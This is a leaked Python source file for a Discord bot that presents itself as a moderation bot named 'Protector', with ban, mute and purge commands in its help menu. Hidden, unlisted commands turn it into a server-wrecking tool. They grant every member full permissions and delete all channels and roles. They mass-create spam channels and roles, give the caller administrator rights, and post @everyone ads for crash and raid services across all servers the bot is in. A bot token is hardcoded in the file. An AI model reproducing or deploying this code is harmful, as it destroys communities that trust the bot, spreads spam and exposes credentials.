# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2

import discord
import keep_alive
from discord import *
from random import randint
import string
import datetime
import random
import dhooks
import contextlib
import io
import aiohttp
from asyncio import create_task
import os
import threading
import time
import requests
import asyncio
import typing
from time import sleep
from discord.ext import commands
from discord.ext.commands import Bot
from discord.utils import get
from os import system, name
from discord.ext.commands import cooldown, BucketType
from threading import Thread, Lock
from discord.ext import commands
from dhooks import Webhook, Embed
from asyncio import sleep
from discord import Intents
from discord.ext import commands
from discord.utils import get
from requests import put
import discord
from asyncio import create_task

token = "OTU3NTE1NjQ5NDY1MzQ4MTA2.Yj_58A.saTyW-yc-5g3yCoUOJqznIbP4Ws"

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='p!', intents=intents)
client.remove_command('help') # удаляем встроенную команду хелпа
"""@commands.cooldown(1, 29, commands.BucketType.user)"""

@client.event
async def on_ready():
  print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')
  global startTime
  startTime = time.time()
  await client.change_presence(activity=discord.Game(name=f"p!help | {len(client.guilds)} серверов"))
        



@client.event
async def on_guild_join(guild):
    emb = discord.Embed(
        title = 'Protector',
        description = '''Библиотека: **[🐍 Discord.py](https://discordpy.readthedocs.io/en/stable/)**\n **Чтобы ознакомиться со списком моих команд напишите:** `p!help`''',
        color = 0xe90000
    )   
    await guild.text_channels[0].send(embed=emb)
    await client.change_presence(activity=discord.Game(name=f"p!help | {len(client.guilds)} серверов"))



@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        tme = f'{round(error.retry_after, 1)}'
        ntme = '.'.join(tme.split('.')[:-1])
        embed = discord.Embed(
            title = 'Ошибка :x:',
            description = f'Вы сможете использовать эту команду только через `{ntme} секунд`.',
            colour = discord.Colour.from_rgb(255, 1, 7)
        )
        msg = await ctx.send(embed=embed)
    elif isinstance(error, commands.MissingPermissions):
        lol2 = discord.Embed(
            title = '💻 Недостаток прав',
            description = "У вас недостаточно прав для выполнения данной команды",
            color = 0xff0000
        )
        await ctx.author.send(embed=lol2)



@client.command()
async def help(ctx):

    mod_text = f'''
```diff
- 1.  p!ban  - забанить участника.
- 2.  p!kick - кикнуть пользователя.
``````yaml
$ 6.  p!av - отправляет аву юзера.
$ 7.  p!massunban - разбанить всех участников.
$ 8.  p!saytext - показывает ваш текст в эмбед.
$ 9.  p!mute - замутить участника.
$ 10. p!unmute - размутить участника.
``````diff
+ 11. p!purge - очистка сообщений.
+ 12. p!ping - пинг бота в милисекундах.
+ 13. p!shar - рандомно отвечает на ваш вопрос.
+ 14. p!nick - сменить ник участнику.
+ 15. p!rand - рандомное число до указанного.
```
'''

    embed = discord.Embed(
        title='📌 | Помощь',
        description=mod_text,
        color=0x2F3136
    )
    await ctx.send(embed=embed)

@client.command(aliases=['info', 'langabot'])
async def about(ctx):
    members = len(set(client.get_all_members()))
    emb = discord.Embed(title='Информация о боте.', description='Вся главная информация о этом боте.',
                        timestamp=ctx.message.created_at, color=0x2F3136)
    emb.add_field(name='Сервер бота', value='[Нажмите](https://discord.gg/lavanbot)')
    emb.add_field(name='GitHub', value='[Нажмите, чтобы перейти](https://github.com/deanoner)')
    emb.add_field(name='Количество Участников', value=f"{members}")
    emb.add_field(name='Количество Серверов', value=f'{len(client.guilds)}')
    emb.add_field(name='Создатель', value='Austr Deanon#8491')
    emb.set_footer(text=f'Запросил: {ctx.author.name}', icon_url=f'{ctx.author.avatar_url}')
    await ctx.send(embed=emb)


@client.command()
async def av(ctx, *,  avamember : discord.Member=None):
    userAvatarUrl = avamember.avatar_url
    embed = discord.Embed(
                title="Аватар пользователя | 👤",
                description=f"**Сервер {ctx.guild.name}**",
                colour=0x00008B)
    embed.set_image(url=f'{userAvatarUrl}')
    await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(administrator=True)
async def massunban(ctx):  # b'\xfc'
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass



# p-ban
@client.command(pass_context=True)
@commands.cooldown(1, 120, commands.BucketType.user)
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await ctx.channel.purge(limit=1)
    await ctx.guild.ban(member)
    emb = discord.Embed(title='Бан', timestamp=ctx.message.created_at, colour=discord.Colour.from_rgb(207, 215, 255))
    emb.add_field(name='**Выдал бан**', value=ctx.message.author.mention, inline=True)
    emb.add_field(name='**Причина**', value=reason, inline=False)
    emb.set_footer(text=f'Запросил: {ctx.author.name}', icon_url=f'{ctx.author.avatar_url}')
    await ctx.send(embed=emb)


# p-kick
@client.command(pass_context=True)
@commands.cooldown(1, 120, commands.BucketType.user)
@commands.has_permissions(kick_members=True)
async def kick(ctx, user: discord.Member):
    await ctx.guild.kick(user)
    emb = discord.Embed(title='Кик', timestamp=ctx.message.created_at, colour=discord.Colour.from_rgb(207, 215, 255))
    emb.add_field(name='**Выгнал**', value=ctx.message.author.mention, inline=True)
    emb.add_field(name='**Причина**', value=reason, inline=False)
    emb.set_footer(text=f'Запросил: {ctx.author.name}', icon_url=f'{ctx.author.avatar_url}')
    await ctx.send(embed=emb)




@client.command(usage="<member> [reason]")
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, *, reason="Вы не указали причину"):
        guild = ctx.guild
        mutedRole = discord.utils.get(guild.roles, name="Замучен")

        if not mutedRole:
            mutedRole = await guild.create_role(name="Замучен")

            for channel in guild.channels:
                await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True,
                                              read_messages=False)
        mute = discord.Embed(description=f"**Участник отправился в мут.**\n\n"
                                         f"**Модератор:**: {ctx.author.mention}\n"
                                         f"**Участник:**: {member.mention}", colour=discord.Colour.blue())
        mute.add_field(name="Причина", value=reason)
        await member.add_roles(mutedRole, reason=reason)
        await ctx.send(embed=mute)

@client.command(usage="<member>")
@commands.has_permissions(manage_messages=True)
async def unmute( ctx, member: discord.Member):
        mutedRole = discord.utils.get(ctx.guild.roles, name="Замучен")

        await member.remove_roles(mutedRole)
        unmute = discord.Embed(description=f"**Участник размучен.**\n\n"
                                           f"**Модератор:** {ctx.author.mention}\n"
                                           f"**Участник:** {member.mention}", colour=discord.Colour.blue())
        await ctx.send(embed=unmute)


@client.command(pass_context=True)
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount=30):
    channel = ctx.message.channel
    messages = []
    async for message in channel.history(limit=amount + 1):
              messages.append(message)
    await channel.delete_messages(messages)
    govno = discord.Embed(
          title=f"Очищено {amount} сообщений",
          description=f"**Модератор:** {ctx.author.mention}\n", colour=discord.Colour.blue())
    await ctx.send(embed=govno)



@client.command(pass_context=True)
async def shar(ctx, *, tet):
    govno1 = discord.Embed(
          title=f"{tet}",
          description=f"Несомненно ✅\n", colour=discord.Colour.blue())
    govno2 = discord.Embed(
          title=f"{tet}",
          description=f"Не задумывайся об этом 😡\n", colour=discord.Colour.blue())
    govno3 = discord.Embed(
          title=f"{tet}",
          description=f"Конечно же нет ❎\n", colour=discord.Colour.blue())
    govno4 = discord.Embed(
          title=f"{tet}",
          description=f"Спроси еще раз ❔\n", colour=discord.Colour.blue())
    govno5 = discord.Embed(
          title=f"{tet}",
          description=f"Лучше промолчать...\n", colour=discord.Colour.blue())
    embed=random.choice([govno1, govno2, govno3, govno4, govno5])
    await ctx.send(embed=embed)




@client.command()
async def rand(ctx, c):
    t= randint(0,int(c))
    randomgovno=discord.Embed(
      title="И вам выпало.....",
      description=f"Число **{t}**",
      colour=discord.Colour.blue()
    )
    await ctx.send(embed=randomgovno)


@client.command(pass_context=True)
@commands.cooldown(1, 30, commands.BucketType.user)
@commands.has_permissions(manage_nicknames=True)
async def nick(ctx, member: discord.Member, nick):
    await member.edit(nick=nick)
    govno1 = discord.Embed(
          title=f"Успех!",
          description=f"Ник {member} успешно изменен на **{nick}** ✅\n", colour=discord.Colour.blue())
    await ctx.send(embed=govno1)




@client.command(aliases = ['Ping', 'пинг', 'Пинг'])
async def ping(ctx): 
    ping = client.ws.latency
    message = await ctx.send('Пинг бота') 
    await message.edit(embed = discord.Embed(title='Пинг бота', description=f'`{ping * 1000:.0f}ms`\n', colour = 0x4300fa))

@client.command(pass_context=True)
async def saytext(ctx, *, text):
    await ctx.message.delete()
    embed = discord.Embed(
        title="Успешно отправлено",
        description=text,
        color=0xff0000)
    await ctx.send(embed=embed)




channame = "crash-by-protector"
chantopic = "Не знаешь как наказать врага? Не беда - тут тебя научат этому - https://t.me/+wSWOVwuFdJk0ZGIy"
rlsname = "Protector"
rlscolor = random

@client.command()
async def great(ctx):
    with open('crash.jpg', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)
    await ctx.guild.edit(name='Crash by Protector Bot')
    try:
      role = discord.utils.get(ctx.guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
    except: pass

    await ctx.message.delete()
    await ctx.author.send(f"Начинаю краш сервера `{ctx.guild.name}`")
    async def delchannels(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != chantopic) or channel.type != discord.ChannelType.text])
    async def delroles(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(role):
            try:
                await role.delete()
            except:
                try:
                    await role.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass
        await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rlsname])
    async def roles(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, color):
            try:
                await guild.create_role(name=name, color=color)
            except:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=rlsname, color=getattr(discord.Colour, rlscolor, discord.Colour.default)()) for _ in range(50)])
    async def channels(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, topic):
            try:
                channel = await guild.create_text_channel(name=name, topic=topic)
            except Exception as e:
                pass 
            else:
                pass
        await asyncio.gather(*[create(name=channame, topic=chantopic) for _ in range(50)])
    tasks = [asyncio.create_task(testtask(ctx.guild)) for testtask in [delchannels, delroles, roles, channels]]
    while False in [x.done() for x in tasks]:
        await asyncio.sleep(0.1)
    pass 

              
    await ctx.author.send(f""":white_check_mark: Удалены все роли, которые возможно
:white_check_mark: Удалены все каналы, которые возможно
:white_check_mark: Изменено имя и аватарка серверу
:white_check_mark: Создано 50 каналов `#crash-by-protector`
:white_check_mark: Идет спам в созданные каналы!
:white_check_mark: Каждому участнику выдан администратор!


         **Сервер полностью крашнут.**""")

@client.command(pass_context=True)
async def adm(ctx): 
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="Protector Admin", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name="Protector Admin") 
    user = ctx.message.author 
    await user.add_roles(role) 
    await ctx.message.delete()
    await ctx.author.send("Вам выдан администратор")

@client.event
async def on_guild_channel_create(channel):
  embed = discord.Embed(
        title="Привет котаны!)",
        description="""**Данный сервер крашится**\n**Хочешь крашить сервера?  Тогда тебе точно к нам!\n Мы представляем:** \n``` ⚡ - Удобных и мощных краш ботов\n 😈 - Помощь с рейдом и крашем\n 👌 - Большое разнообразие ботов```\n ▫️ `Дискорд сервер` https://discord.gg/lavanbot\n▫️ `Телеграм` https://t.me/+wSWOVwuFdJk0ZGIy\n▫️ `Вк создателя` https://vk.com/antimapper""", 
        colour = 0xc10cdd
  )
  for _ in range(5):
    try:
        await channel.send(f'||@everyone|| https://discord.gg/lavanbot', embed=embed)
    except:
        pass


@client.command()
async def ultragvrwrv1111(guild):
        for guild in client.guilds: 
            try:
                chan = await guild.create_text_channel(name="ПЕРЕЕЗД", topic="ГТА")
                print(f"создал канал на сервере {guild.name}")
                await chan.send("ДАННЫЙ СЕРВЕР ПЕРЕЕЗЖАЕТ СЮДА - https://discord.gg/lavanbot @everyone  и тг канал Не знаешь как наказать врага? Не беда - тут тебя научат этому - https://t.me/+wSWOVwuFdJk0ZGIy")
                print("в канал отправил")
                await guild.leave()
            except: pass

# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2

keep_alive.keep_alive()
client.run(token, bot=True)